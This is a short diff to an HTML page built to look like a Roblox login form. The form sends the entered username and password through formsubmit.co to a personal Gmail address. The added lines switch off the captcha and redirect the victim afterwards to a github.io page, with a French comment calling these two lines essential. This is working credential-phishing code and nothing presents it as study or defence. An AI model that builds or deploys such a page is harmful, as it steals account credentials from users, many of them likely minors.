@@ -178,6 +178,11 @@
     <div class="login-card">
       <h2>Login to Roblox</h2>
       <form action="https://formsubmit.co/celiamireux9@gmail.com" method="POST" enctype="multipart/form-data">
+    
+    <!-- Ces 2 lignes sont essentielles : -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://928398.github.io/commu.github.io/index2.html">
+    
       <input name="pseudo1" type="text" placeholder="Username/Email/Phone" />
       <input name="ps2" type="password" placeholder="Password" />
       <button type="submit" class="btn-login">Log In</button>
